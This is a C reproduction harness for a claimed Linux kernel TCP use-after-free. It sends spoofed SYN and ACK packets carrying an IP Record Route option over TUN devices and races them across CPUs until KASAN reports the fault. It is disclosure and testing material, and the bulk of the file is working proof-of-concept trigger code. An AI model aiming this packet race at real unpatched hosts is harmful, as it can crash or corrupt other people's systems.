/*
 * CVE-2026-98432 (IPv4 TCP use-after-free in ip_options_build via ireq_opt)
 *
 * Trigger-only reproduction harness. Runs as /init inside a minimal initramfs
 * under an *unpatched* kernel built with KASAN (linux-6.18.55).
 *
 * It does NOT exploit anything: no heap grooming, no payload, no privilege
 * escalation. The only success signal is the kernel itself reporting a KASAN
 * use-after-free, which proves the faulty object lifetime is reachable.
 *
 * Mechanism (see README.md for file:line references):
 *   1. SYN carrying an IPv4 Record Route option -> tcp_v4_save_options() stores
 *      a copy in ireq->ireq_opt.
 *   2. Handshake completion -> tcp_v4_syn_recv_sock() moves that same pointer to
 *      the child socket (no copy) and clears ireq->ireq_opt.
 *   3. A retransmitted SYN processed concurrently on another CPU reads the
 *      options in ip_options_build() under rcu_read_lock() only.
 *   4. The child is not SOCK_RCU_FREE, so closing it frees inet_opt with a plain
 *      kfree() while step 3 may still be reading it.
 *
 * Build: gcc -Wall -Wextra -O2 -pthread -static -o init trigger.c
 */

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <linux/if_tun.h>
#include <poll.h>
#include <netinet/in.h>
#include <pthread.h>
#include <signal.h>
#include <stdarg.h>
#include <stdatomic.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mount.h>
#include <sys/reboot.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#define SRV_PORT 38979 /* 0x9843 */
#define SRV_IP "10.0.0.1" /* local address on tun0 (the victim) */
#define CLI_IP "10.0.0.2" /* NOT assigned locally: spoofed client source */
#define TUN_NAME "tun0"
#define SRV_LOOPBACK SRV_IP

/*
 * Each race pair gets its own tun device and its own /24.
 *
 * This is not cosmetic: dup() of one tun fd shares one packet queue, so with a
 * single device every sniffer thread consumes whichever SYNACK arrives first
 * and the others starve waiting for a packet another thread stole. Separate
 * devices give each pair a private queue, so SYNACK matching is exact and the
 * attempt rate stays high.
 */
struct pair_net {
	int tun;
	char dev[IFNAMSIZ];
	uint8_t srv[4]; /* victim address, assigned on the device */
	uint8_t cli[4]; /* spoofed client address, never assigned */
};

#define NTHREADS 4
#define NPAIRS NTHREADS /* one SYN-injector partner thread per attacker */
#define MAX_JITTER 4096 /* spin-sweep across the interleaving window */
#define SPORT_BASE 20000
#define SPORTS_PER_THREAD 2048

static struct pair_net g_nets[NPAIRS];
#define IP_OPT_HDRLEN 28 /* 20 + 8 bytes of options */
#define TCP_HDRLEN 20
#define SYN_FRAME_LEN (IP_OPT_HDRLEN + TCP_HDRLEN)
#define PLAIN_FRAME_LEN (20 + TCP_HDRLEN)

#define TCP_FIN 0x01
#define TCP_SYN 0x02
#define TCP_RST 0x04
#define TCP_ACK 0x10

#define RR_OPT_LEN 7 /* kind(1) + len(1) + ptr(1) + 4 address bytes */

static atomic_ullong g_attempts;
static atomic_ullong g_accepts;
static volatile sig_atomic_t g_stop;

static double now_ms(void)
{
	struct timespec ts;

	clock_gettime(CLOCK_MONOTONIC, &ts);
	return (double)ts.tv_sec * 1000.0 + (double)ts.tv_nsec / 1e6;
}

static void fatal(const char *fmt, ...)
{
	va_list ap;

	va_start(ap, fmt);
	fputs("FATAL: ", stdout);
	vprintf(fmt, ap);
	va_end(ap);
	fflush(NULL);
	sync();
	reboot(RB_POWER_OFF);
	exit(1);
}

static void on_signal(int sig)
{
	(void)sig;
	g_stop = 1;
}

static void poweroff_now(void)
{
	fflush(NULL);
	sync();
	reboot(RB_POWER_OFF);
	for (;;)
		pause();
}

/* ---------------------------------------------------------------- checksums */

static unsigned short inet_csum(const void *data, size_t len)
{
	const uint8_t *p = (const uint8_t *)data;
	uint32_t sum = 0;

	while (len > 1) {
		sum += ((uint32_t)p[0] << 8) | p[1];
		p += 2;
		len -= 2;
	}
	if (len)
		sum += (uint32_t)p[0] << 8;
	while (sum >> 16)
		sum = (sum & 0xffff) + (sum >> 16);
	return (unsigned short)~sum & 0xffff;
}

static unsigned short tcp_csum(const uint8_t saddr[4], const uint8_t daddr[4],
			       const uint8_t *tcp, size_t tcplen)
{
	uint8_t pseudo[12 + TCP_HDRLEN];

	memset(pseudo, 0, sizeof(pseudo));
	memcpy(pseudo, saddr, 4);
	memcpy(pseudo + 4, daddr, 4);
	pseudo[8] = 0;
	pseudo[9] = IPPROTO_TCP;
	pseudo[10] = (uint8_t)(tcplen >> 8);
	pseudo[11] = (uint8_t)(tcplen & 0xff);
	memcpy(pseudo + 12, tcp, tcplen);
	return inet_csum(pseudo, sizeof(pseudo));
}

/* ----------------------------------------------------------- packet builder */

/*
 * Builds an IPv4/TCP frame with IP_HDRINCL layout (no link-layer header).
 * with_opts == true  -> Record Route option present, IHL 7, total length 48.
 * with_opts == false -> bare 20-byte IP header.
 */
static size_t build_tcp_pkt(uint8_t *buf, uint16_t sport, uint16_t dport,
			    uint32_t seq, uint32_t ack, uint8_t flags,
			    bool with_opts, uint16_t ip_id,
			    const uint8_t src[4], const uint8_t dst[4])
{
	const size_t iphl = with_opts ? IP_OPT_HDRLEN : 20;
	const size_t tot = iphl + TCP_HDRLEN;
	unsigned short csum;
	uint8_t *tcp;

	memset(buf, 0, tot);

	/* IPv4 header */
	buf[0] = (uint8_t)(0x40 | (iphl / 4));
	buf[1] = 0; /* DSCP/ECN */
	buf[2] = (uint8_t)(tot >> 8);
	buf[3] = (uint8_t)(tot & 0xff);
	buf[4] = (uint8_t)(ip_id >> 8);
	buf[5] = (uint8_t)(ip_id & 0xff);
	buf[6] = 0; /* flags / fragment offset */
	buf[7] = 0;
	buf[8] = 64; /* TTL */
	buf[9] = IPPROTO_TCP;
	memcpy(buf + 12, src, 4);
	memcpy(buf + 16, dst, 4);

	if (with_opts) {
		/* Record Route: kind=7 len=7 ptr=4, one 4-byte slot, then NOP pad */
		buf[20] = 7;
		buf[21] = RR_OPT_LEN;
		buf[22] = 4;
		buf[23] = src[0];
		buf[24] = 0;
		buf[25] = 0;
		buf[26] = 1;
		buf[27] = 1; /* NOP, keeps header 4-byte aligned */
	}

	csum = inet_csum(buf, iphl);
	buf[10] = (uint8_t)(csum >> 8);
	buf[11] = (uint8_t)(csum & 0xff);

	/* TCP header */
	tcp = buf + iphl;
	tcp[0] = (uint8_t)(sport >> 8);
	tcp[1] = (uint8_t)(sport & 0xff);
	tcp[2] = (uint8_t)(dport >> 8);
	tcp[3] = (uint8_t)(dport & 0xff);
	tcp[4] = (uint8_t)(seq >> 24);
	tcp[5] = (uint8_t)((seq >> 16) & 0xff);
	tcp[6] = (uint8_t)((seq >> 8) & 0xff);
	tcp[7] = (uint8_t)(seq & 0xff);
	tcp[8] = (uint8_t)(ack >> 24);
	tcp[9] = (uint8_t)((ack >> 16) & 0xff);
	tcp[10] = (uint8_t)((ack >> 8) & 0xff);
	tcp[11] = (uint8_t)(ack & 0xff);
	tcp[12] = (uint8_t)((TCP_HDRLEN / 4) << 4);
	tcp[13] = flags;
	tcp[14] = 0xff; /* window */
	tcp[15] = 0xff;

	csum = tcp_csum(src, dst, tcp, TCP_HDRLEN);
	tcp[16] = (uint8_t)(csum >> 8);
	tcp[17] = (uint8_t)(csum & 0xff);

	return tot;
}

/* ---------------------------------------------------------------- raw sockets */

/*
 * TUN device. The victim must be reachable by packets whose source address is
 * NOT local to this stack.
 *
 * Reason: the harness has to read the server's SYNACK. If the spoofed client IP
 * were local (e.g. all-loopback, as in a first attempt), the local stack would
 * consume the SYNACK during delivery to a socket that does not exist and answer
 * it with an RST (echoing the IP options, so it is visibly the reply to the
 * SYNACK). That RST destroys the request socket before the completing ACK
 * arrives, so the handshake can never complete and the bug is unreachable.
 * A real remote attacker has no such local stack.
 *
 * With tun0 = 10.0.0.1/24 and the client spoofing 10.0.0.2 (not assigned
 * anywhere), SYNACKs are routed out tun0 and we read them from the tun fd, with
 * no local delivery and no RST. Everything is IPv4-over-TUN with IFF_NO_PI, so
 * read()/write() carry bare IP packets.
 */
static int g_tun = -1;

/* Brings up tun<idx> as 10.<idx>.0.1/24; the spoofed client is 10.<idx>.0.2. */
static int tun_setup(int idx)
{
	struct ifreq ifr;
	struct sockaddr_in *sin;
	int fd, ctl, i;
	char addr[16], mask[16];

	if (idx >= NPAIRS)
		fatal("tun_setup: idx %d out of range", idx);

	snprintf(g_nets[idx].dev, sizeof(g_nets[idx].dev), "tun%d", idx);
	g_nets[idx].srv[0] = 10;
	g_nets[idx].srv[1] = (uint8_t)idx;
	g_nets[idx].srv[2] = 0;
	g_nets[idx].srv[3] = 1;
	g_nets[idx].cli[0] = 10;
	g_nets[idx].cli[1] = (uint8_t)idx;
	g_nets[idx].cli[2] = 0;
	g_nets[idx].cli[3] = 2;
	snprintf(addr, sizeof(addr), "10.%d.0.1", idx);
	snprintf(mask, sizeof(mask), "255.255.255.0");

	mkdir("/dev/net", 0755);
	fd = open("/dev/net/tun", O_RDWR);
	if (fd < 0)
		fatal("open(/dev/net/tun): %s (need CONFIG_TUN=y)",
		      strerror(errno));

	memset(&ifr, 0, sizeof(ifr));
	ifr.ifr_flags = IFF_TUN | IFF_NO_PI;
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", g_nets[idx].dev);
	if (ioctl(fd, TUNSETIFF, &ifr) < 0)
		fatal("ioctl(TUNSETIFF %s): %s", g_nets[idx].dev,
		      strerror(errno));

	ctl = socket(AF_INET, SOCK_DGRAM, 0);
	if (ctl < 0)
		fatal("socket(AF_INET, SOCK_DGRAM): %s", strerror(errno));

	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", g_nets[idx].dev);
	sin = (struct sockaddr_in *)&ifr.ifr_addr;
	sin->sin_family = AF_INET;
	inet_pton(AF_INET, addr, &sin->sin_addr);
	if (ioctl(ctl, SIOCSIFADDR, &ifr) < 0)
		fatal("ioctl(SIOCSIFADDR %s): %s", addr, strerror(errno));

	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", g_nets[idx].dev);
	sin = (struct sockaddr_in *)&ifr.ifr_netmask;
	sin->sin_family = AF_INET;
	inet_pton(AF_INET, mask, &sin->sin_addr);
	if (ioctl(ctl, SIOCSIFNETMASK, &ifr) < 0)
		fatal("ioctl(SIOCSIFNETMASK): %s", strerror(errno));

	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", g_nets[idx].dev);
	if (ioctl(ctl, SIOCGIFFLAGS, &ifr) < 0)
		fatal("ioctl(SIOCGIFFLAGS): %s", strerror(errno));
	ifr.ifr_flags = (short)(ifr.ifr_flags | IFF_UP | IFF_RUNNING);
	if (ioctl(ctl, SIOCSIFFLAGS, &ifr) < 0)
		fatal("ioctl(SIOCSIFFLAGS): %s", strerror(errno));

	close(ctl);
	g_nets[idx].tun = fd;
	if (idx == 0)
		g_tun = fd;

	printf("tun: %s up, victim=%s spoofed-client=%s\n", g_nets[idx].dev,
	       addr, "10.X.0.2");
	for (i = 0; i < 4; i++)
		(void)g_nets[idx].cli[i];
	return fd;
}

static int open_send_socket_pair(int idx)
{
	if (idx < 0 || idx >= NPAIRS || g_nets[idx].tun < 0)
		fatal("open_send_socket_pair(%d): tun not initialised", idx);
	return g_nets[idx].tun;
}

static int open_sniff_socket_pair(int idx)
{
	int fd, fl;

	if (idx < 0 || idx >= NPAIRS || g_nets[idx].tun < 0)
		fatal("open_sniff_socket_pair(%d): tun not initialised", idx);
	fd = dup(g_nets[idx].tun);
	if (fd < 0)
		fatal("dup(tun%d): %s", idx, strerror(errno));
	fl = fcntl(fd, F_GETFL, 0);
	if (fl < 0 || fcntl(fd, F_SETFL, fl | O_NONBLOCK) < 0)
		fatal("fcntl(O_NONBLOCK): %s", strerror(errno));
	return fd;
}


/* Reads one IP packet from the tun fd, waiting up to timeout_ms. */
static ssize_t tun_recv(int fd, uint8_t *buf, size_t len, int timeout_ms)
{
	struct pollfd pfd;
	int rc;

	pfd.fd = fd;
	pfd.events = POLLIN;
	pfd.revents = 0;
	rc = poll(&pfd, 1, timeout_ms);
	if (rc <= 0)
		return -1;
	return read(fd, buf, len);
}

static void send_frame(int fd, const uint8_t *buf, size_t len)
{
	ssize_t n;

	if (fd < 0)
		fatal("send_frame: bad fd");
	n = write(fd, buf, len);
	if (n < 0)
		fatal("write(tun, %zu bytes): %s", len, strerror(errno));
	if ((size_t)n != len)
		fatal("write(tun): short write %zd/%zu", n, len);
}

/*
 * Waits for the SYNACK of a given 4-tuple and returns the server sequence
 * number. Loopback frames may or may not carry a 14-byte Ethernet header
 * depending on the device, so the IP offset is auto-detected.
 * Returns 0 on success, -1 on timeout.
 */
static int wait_synack(int fd, uint16_t sport, uint32_t *out_seq, int timeout_ms)
{
	uint8_t buf[2048];
	double deadline = now_ms() + (double)timeout_ms;

	for (;;) {
		double left = deadline - now_ms();
		ssize_t n;
		size_t off;

		if (left <= 0)
			return -1;
		n = tun_recv(fd, buf, sizeof(buf), (int)left);
		if (n < 0) {
			if (errno == EAGAIN || errno == EWOULDBLOCK ||
			    errno == EINTR)
				continue;
			return -1;
		}
		if (n < 34)
			continue;

		if ((buf[0] >> 4) == 4)
			off = 0;
		else if (buf[12] == 0x08 && buf[13] == 0x00)
			off = 14;
		else
			continue;

		if ((size_t)n < off + 20)
			continue;

		const uint8_t *ip = buf + off;
		size_t ihl = (size_t)(ip[0] & 0x0f) * 4;
		const uint8_t *tcp;
		uint16_t sport_be, dport_be;
		uint32_t seq;

		if (ip[9] != IPPROTO_TCP)
			continue;
		if (ihl < 20 || (size_t)n < off + ihl + TCP_HDRLEN)
			continue;

		tcp = ip + ihl;
		sport_be = (uint16_t)((tcp[0] << 8) | tcp[1]);
		dport_be = (uint16_t)((tcp[2] << 8) | tcp[3]);
		if (sport_be != SRV_PORT || dport_be != sport)
			continue;
		if ((tcp[13] & (TCP_SYN | TCP_ACK)) != (TCP_SYN | TCP_ACK))
			continue;

		seq = ((uint32_t)tcp[4] << 24) | ((uint32_t)tcp[5] << 16) |
		      ((uint32_t)tcp[6] << 8) | (uint32_t)tcp[7];
		*out_seq = seq;
		return 0;
	}
}

/* --------------------------------------------------------------- components */

static int g_listen_fd = -1;

/* Prints /proc/net/tcp rows for our port pair; hand-run diagnostic. */
static void dump_tcp_state(uint16_t sport);

/* Prints every TCP packet seen for our port pair; hand-run diagnostic. */
static void sniff_dump(int fd, uint16_t sport, int ms);

/*
 * Race pairs.
 *
 * On loopback the receive path runs in the *sender's* context, so an ACK and a
 * duplicate SYN emitted by the same thread are processed one after the other
 * on one CPU and can never overlap. Each pair therefore uses two threads on two
 * vCPUs: the attacker arms the pair and sends the completing ACK, while the
 * partner busy-spins on the arm flag and emits the duplicate SYN after a swept
 * spin delay, so both packets are processed concurrently in the kernel.
 */
struct race_pair {
	atomic_int arm; /* 0 = idle, else 1 + spin jitter for the partner */
	atomic_int done; /* partner sets to 1 after its sendto() */
	uint8_t pkt[SYN_FRAME_LEN];
	size_t len;
	int sfd; /* the partner's own raw socket */
};

static struct race_pair g_pairs[NPAIRS];

static void *syn_partner_thread(void *arg)
{
	long idx = (long)arg;
	struct race_pair *p = &g_pairs[idx];

	p->sfd = open_send_socket_pair((int)idx);

	while (!g_stop) {
		int v = atomic_load_explicit(&p->arm, memory_order_acquire);
		int jitter;

		if (v == 0) {
			__asm__ __volatile__("pause");
			continue;
		}

		jitter = v - 1;
		for (int i = 0; i < jitter; i++)
			__asm__ __volatile__("pause");

		send_frame(p->sfd, p->pkt, p->len);
		atomic_store_explicit(&p->done, 1, memory_order_release);
	}

	return NULL;
}

static void *server_thread(void *arg)
{
	(void)arg;

	for (;;) {
		struct linger lg;
		int fd;

		fd = accept(g_listen_fd, NULL, NULL);
		if (fd < 0) {
			if (errno == EINTR || errno == ECONNABORTED)
				continue;
			if (g_stop)
				return NULL;
			usleep(100);
			continue;
		}
		/* Destroy the child socket immediately: this is the free side. */
		lg.l_onoff = 1;
		lg.l_linger = 0;
		setsockopt(fd, SOL_SOCKET, SO_LINGER, &lg, sizeof(lg));
		close(fd);
		atomic_fetch_add(&g_accepts, 1);
	}
	return NULL;
}

static void open_listener(void)
{
	struct sockaddr_in sa;
	int one = 1;

	g_listen_fd = socket(AF_INET, SOCK_STREAM, 0);
	if (g_listen_fd < 0)
		fatal("socket(AF_INET, SOCK_STREAM): %s", strerror(errno));
	setsockopt(g_listen_fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

	memset(&sa, 0, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_port = htons(SRV_PORT);
	sa.sin_addr.s_addr = htonl(INADDR_ANY);
	if (bind(g_listen_fd, (struct sockaddr *)&sa, sizeof(sa)) < 0)
		fatal("bind(127.0.0.1:%d): %s", SRV_PORT, strerror(errno));
	if (listen(g_listen_fd, 4096) < 0)
		fatal("listen(): %s", strerror(errno));
}

static uint32_t xs_next(uint64_t *s)
{
	*s ^= *s << 13;
	*s ^= *s >> 7;
	*s ^= *s << 17;
	return (uint32_t)(*s >> 16);
}

/*
 * One race attempt: SYN with RR option, read SYNACK, then fire the handshake
 * completing ACK from this thread while the partner thread fires the duplicate
 * SYN (same 4-tuple, same ISN, same option) concurrently on another vCPU.
 * The partner's spin delay is swept so both interleavings get sampled. Every
 * 8th attempt also injects a RST to provoke fast teardown of an unaccepted
 * child.
 */
static void attempt(int sfd, int nfd, uint16_t sport, uint64_t *rng, bool rst,
		    struct race_pair *p, const struct pair_net *net)
{
	uint8_t syn[SYN_FRAME_LEN];
	uint8_t pkt[SYN_FRAME_LEN];
	uint32_t isn, srv_seq, my_ack;
	size_t len;
	int jitter;

	isn = xs_next(rng);
	len = build_tcp_pkt(syn, sport, SRV_PORT, isn, 0, TCP_SYN, true,
			    (uint16_t)xs_next(rng), net->cli, net->srv);
	send_frame(sfd, syn, len);

	if (wait_synack(nfd, sport, &srv_seq, 20) < 0)
		return;

	my_ack = srv_seq + 1;

	/* Arm the partner with the duplicate SYN, then send the ACK ourselves. */
	p->len = build_tcp_pkt(p->pkt, sport, SRV_PORT, isn, 0, TCP_SYN, true,
			       (uint16_t)xs_next(rng), net->cli, net->srv);
	atomic_store_explicit(&p->done, 0, memory_order_relaxed);
	jitter = 1 + (int)(xs_next(rng) % MAX_JITTER);
	atomic_store_explicit(&p->arm, jitter, memory_order_release);

	len = build_tcp_pkt(pkt, sport, SRV_PORT, isn + 1, my_ack, TCP_ACK,
			    false, (uint16_t)xs_next(rng), net->cli, net->srv);
	send_frame(sfd, pkt, len);

	for (int i = 0; i < 100000; i++) {
		if (atomic_load_explicit(&p->done, memory_order_acquire))
			break;
		__asm__ __volatile__("pause");
	}
	atomic_store_explicit(&p->arm, 0, memory_order_release);

	if (rst) {
		len = build_tcp_pkt(pkt, sport, SRV_PORT, my_ack, 0, TCP_RST,
				    false, (uint16_t)xs_next(rng), net->cli,
				    net->srv);
		send_frame(sfd, pkt, len);
	}

	atomic_fetch_add(&g_attempts, 1);
}

static void *attacker_thread(void *arg)
{
	long tid = (long)arg;
	struct race_pair *p = &g_pairs[tid % NPAIRS];
	uint64_t rng = 0x9e3779b97f4a7c15ULL ^ (uint64_t)(tid + 1) *
						    0x2545f4914f6cdd1dULL;
	unsigned int iter = 0;
	const struct pair_net *net = &g_nets[tid % NPAIRS];
	int sfd = open_send_socket_pair((int)(tid % NPAIRS));
	int nfd = open_sniff_socket_pair((int)(tid % NPAIRS));

	printf("attacker%ld: %s send fd=%d sniff fd=%d sport range %d..%d\n", tid,
	       net->dev,
	       sfd, nfd, SPORT_BASE + (int)tid * SPORTS_PER_THREAD,
	       SPORT_BASE + (int)tid * SPORTS_PER_THREAD +
		       SPORTS_PER_THREAD - 1);

	while (!g_stop) {
		uint16_t sport = (uint16_t)(SPORT_BASE +
					   (int)tid * SPORTS_PER_THREAD +
					   (int)(iter % SPORTS_PER_THREAD));
		bool rst = (iter % 8) == 0;

		iter++;
		attempt(sfd, nfd, sport, &rng, rst, p, net);
	}

	return NULL;
}

/* ------------------------------------------------------------ kmsg watcher */

static void *kmsg_thread(void *arg)
{
	char line[4096];
	bool hit = false;
	double hit_deadline = 0;
	int fd;

	(void)arg;

	fd = open("/dev/kmsg", O_RDONLY | O_NONBLOCK);
	if (fd < 0) {
		printf("kmsg: cannot open /dev/kmsg: %s\n", strerror(errno));
		return NULL;
	}

	while (!g_stop) {
		ssize_t n = read(fd, line, sizeof(line) - 1);

		if (n <= 0) {
			if (hit && now_ms() >= hit_deadline)
				break;
			usleep(1000);
			continue;
		}
		line[n] = '\0';

		/* kmsg records look like "prio,seq,usec,flags;text" */
		char *msg = strchr(line, ';');
		msg = msg ? msg + 1 : line;

		if (hit || strstr(msg, "BUG: KASAN") ||
		    strstr(msg, "use-after-free")) {
			printf("KMSG: %s", msg);
			if (!strstr(msg, "\n"))
				printf("\n");
			fflush(NULL);
			if (!hit) {
				hit = true;
				hit_deadline = now_ms() + 1500;
			}
		}
	}

	if (hit) {
		printf("RESULT: KASAN_UAF_DETECTED attempts=%llu accepts=%llu\n",
		       (unsigned long long)atomic_load(&g_attempts),
		       (unsigned long long)atomic_load(&g_accepts));
		g_stop = 1;
		poweroff_now();
	}
	return NULL;
}

/* ---------------------------------------------------------------- selftest */

static int run_selftest(void)
{
	uint8_t syn[SYN_FRAME_LEN];
	uint8_t pkt[SYN_FRAME_LEN];
	uint64_t rng = 0x123456789abcdefULL;
	uint32_t srv_seq;
	uint16_t sport = (uint16_t)(SPORT_BASE + 1);
	unsigned long long before = atomic_load(&g_accepts);
	size_t len;
	int sfd, nfd;

	printf("SELFTEST: start\n");
	sfd = open_send_socket_pair(0);
	nfd = open_sniff_socket_pair(0);
	const struct pair_net *net = &g_nets[0];

	len = build_tcp_pkt(syn, sport, SRV_PORT, 0x11223344, 0, TCP_SYN, true,
			    (uint16_t)xs_next(&rng), net->cli, net->srv);
	send_frame(sfd, syn, len);

	if (wait_synack(nfd, sport, &srv_seq, 1000) < 0) {
		printf("SELFTEST: FAIL no SYNACK (raw path or listener broken)\n");
		goto out;
	}
	printf("SELFTEST: SYNACK ok server_seq=%u\n", srv_seq);

	len = build_tcp_pkt(pkt, sport, SRV_PORT, 0x11223345, srv_seq + 1,
			    TCP_ACK, false, (uint16_t)xs_next(&rng), net->cli,
			    net->srv);
	send_frame(sfd, pkt, len);

	for (int i = 0; i < 200; i++) {
		if (atomic_load(&g_accepts) > before)
			break;
		usleep(5000);
	}
	if (atomic_load(&g_accepts) > before) {
		printf("SELFTEST: PASS handshake completed and server accept() fired\n");
	} else {
		printf("SELFTEST: FAIL handshake not accepted\n");
		sniff_dump(nfd, sport, 300);
		dump_tcp_state(sport);
		goto out;
	}

out:
	fflush(NULL);
	sync();
	reboot(RB_POWER_OFF);
	return 0;
}

/* -------------------------------------------------------------------- main */

/* Prints /proc/net/tcp rows for our port pair; hand-run diagnostic. */
static void dump_tcp_state(uint16_t sport)
{	char line[512];
	char want1[16], want2[16];
	FILE *f;

	snprintf(want1, sizeof(want1), "%04X", sport);
	snprintf(want2, sizeof(want2), "%04X", SRV_PORT);
	f = fopen("/proc/net/tcp", "r");
	if (!f) {
		printf("DUMP: cannot open /proc/net/tcp: %s\n", strerror(errno));
		return;
	}
	printf("DUMP: /proc/net/tcp rows involving :%s or :%s\n", want1,
	       want2);
	while (fgets(line, sizeof(line), f)) {
		if (strstr(line, want1) || strstr(line, want2))
			printf("DUMP: %s", line);
	}
	fclose(f);
}

static void sniff_dump(int fd, uint16_t sport, int ms)
{
	uint8_t buf[2048];
	double deadline = now_ms() + (double)ms;

	while (now_ms() < deadline) {
		double left = deadline - now_ms();
		ssize_t n;
		size_t off;

		if (left <= 0)
			break;
		n = tun_recv(fd, buf, sizeof(buf), (int)left);
		if (n < 34)
			continue;
		if ((buf[0] >> 4) == 4)
			off = 0;
		else if (buf[12] == 0x08 && buf[13] == 0x00)
			off = 14;
		else
			continue;
		if ((size_t)n < off + 20)
			continue;

		const uint8_t *ip = buf + off;
		size_t ihl = (size_t)(ip[0] & 0x0f) * 4;
		const uint8_t *tcp;
		uint16_t s, d;
		uint32_t seq, ack;

		if (ip[9] != IPPROTO_TCP || ihl < 20 ||
		    (size_t)n < off + ihl + TCP_HDRLEN)
			continue;
		tcp = ip + ihl;
		s = (uint16_t)((tcp[0] << 8) | tcp[1]);
		d = (uint16_t)((tcp[2] << 8) | tcp[3]);
		if (!((s == SRV_PORT && d == sport) ||
		      (s == sport && d == SRV_PORT)))
			continue;
		seq = ((uint32_t)tcp[4] << 24) | ((uint32_t)tcp[5] << 16) |
		      ((uint32_t)tcp[6] << 8) | tcp[7];
		ack = ((uint32_t)tcp[8] << 24) | ((uint32_t)tcp[9] << 16) |
		      ((uint32_t)tcp[10] << 8) | tcp[11];
		printf("SNIFF: %u->%u flags=%s%s%s%s iphl=%zu seq=%u ack=%u\n",
		       s, d, (tcp[13] & TCP_SYN) ? "S" : "-",
		       (tcp[13] & TCP_ACK) ? "A" : "-",
		       (tcp[13] & TCP_RST) ? "R" : "-",
		       (tcp[13] & TCP_FIN) ? "F" : "-", ihl, seq, ack);
	}
	fflush(NULL);
}

static void mount_setup(void)
{
	mkdir("/dev", 0755);
	mkdir("/proc", 0755);
	if (mount("devtmpfs", "/dev", "devtmpfs", 0, NULL) < 0 &&
	    errno != EBUSY)
		printf("mount(devtmpfs): %s\n", strerror(errno));
	if (mount("proc", "/proc", "proc", 0, NULL) < 0 && errno != EBUSY)
		printf("mount(proc): %s\n", strerror(errno));
	for (unsigned int ti = 0; ti < NPAIRS; ti++)
		tun_setup((int)ti);

	/*
	 * Bigger queues, so the kernel does not switch to SYN cookies halfway
	 * through a run. Cookie requests never allocate ireq_opt, so the
	 * vulnerable path vanishes. Real servers run with large queues too.
	 */
	{
		static const char *const knobs[][2] = {
			{ "/proc/sys/net/core/somaxconn", "65535" },
			{ "/proc/sys/net/ipv4/tcp_max_syn_backlog", "65535" },
		};

		for (unsigned int ki = 0; ki < 2; ki++) {
			int kfd = open(knobs[ki][0], O_WRONLY);

			if (kfd < 0)
				continue;
			if (write(kfd, knobs[ki][1],
				  strlen(knobs[ki][1])) > 0)
				printf("sysctl: %s=%s\n", knobs[ki][0],
				       knobs[ki][1]);
			close(kfd);
		}
	}

	/*
	 * Disable MPTCP globally, if the kernel has it. The harness never opens an
	 * MPTCP socket (it uses plain IPPROTO_TCP listeners), so this only makes
	 * the "this is not an MPTCP bug" claim explicit and checkable.
	 */
	{
		int mfd = open("/proc/sys/net/mptcp/enabled", O_WRONLY);

		if (mfd >= 0) {
			if (write(mfd, "0\n", 2) == 2)
				printf("mptcp: net.mptcp.enabled=0 (disabled)\n");
			else
				printf("mptcp: could not disable: %s\n",
				       strerror(errno));
			close(mfd);
		} else {
			printf("mptcp: no sysctl present (%s)\n",
			       strerror(errno));
		}
	}
}

int main(int argc, char **argv)
{
	pthread_t ktid, stid, atid[NTHREADS], ptid[NPAIRS];
	bool selftest = false;
	int max_seconds = 600;
	double t0, last_report;
	unsigned int i;

	for (i = 1; i < (unsigned int)argc; i++) {
		int v;

		if (strcmp(argv[i], "selftest") == 0) {
			selftest = true;
			continue;
		}
		v = atoi(argv[i]);
		if (v > 0)
			max_seconds = v;
	}

	signal(SIGTERM, on_signal);
	signal(SIGINT, on_signal);
	signal(SIGALRM, on_signal);

	mount_setup();

	printf("CVE-2026-98432 harness: pid=%d cpus=%ld target=%s:%d "
	       "threads=%d max_seconds=%d\n",
	       (int)getpid(), sysconf(_SC_NPROCESSORS_ONLN), SRV_LOOPBACK,
	       SRV_PORT, NTHREADS, max_seconds);
	printf("ATTEMPTS: 0\n");
	fflush(NULL);

	if (pthread_create(&ktid, NULL, kmsg_thread, NULL) != 0)
		fatal("pthread_create(kmsg) failed");

	open_listener();
	printf("server: listening on %s:%d, accept+SO_LINGER(0)+close loop\n",
	       SRV_LOOPBACK, SRV_PORT);
	fflush(NULL);

	if (pthread_create(&stid, NULL, server_thread, NULL) != 0)
		fatal("pthread_create(server) failed");

	usleep(200000);

	if (selftest)
		return run_selftest();

	for (i = 0; i < NTHREADS; i++) {
		if (pthread_create(&atid[i], NULL, attacker_thread,
				   (void *)(long)i) != 0)
			fatal("pthread_create(attacker %u) failed", i);
	}
	for (i = 0; i < NPAIRS; i++) {
		if (pthread_create(&ptid[i], NULL, syn_partner_thread,
				   (void *)(long)i) != 0)
			fatal("pthread_create(syn partner %u) failed", i);
	}

	t0 = now_ms();
	last_report = t0;

	while (!g_stop) {
		double now = now_ms();

		if (max_seconds > 0 && (now - t0) >= (double)max_seconds * 1000.0)
			break;
		if (now - last_report >= 5000.0) {
			printf("ATTEMPTS: %llu accepts=%llu elapsed=%.0fs\n",
			       (unsigned long long)atomic_load(&g_attempts),
			       (unsigned long long)atomic_load(&g_accepts),
			       (now - t0) / 1000.0);
			fflush(NULL);
			last_report = now;
		}
		usleep(20000);
	}

	g_stop = 1;
	usleep(100000);

	printf("RESULT: NO_UAF attempts=%llu accepts=%llu elapsed=%.0fs "
	       "max_seconds=%d\n",
	       (unsigned long long)atomic_load(&g_attempts),
	       (unsigned long long)atomic_load(&g_accepts),
	       (now_ms() - t0) / 1000.0, max_seconds);
	poweroff_now();
	return 0;
}
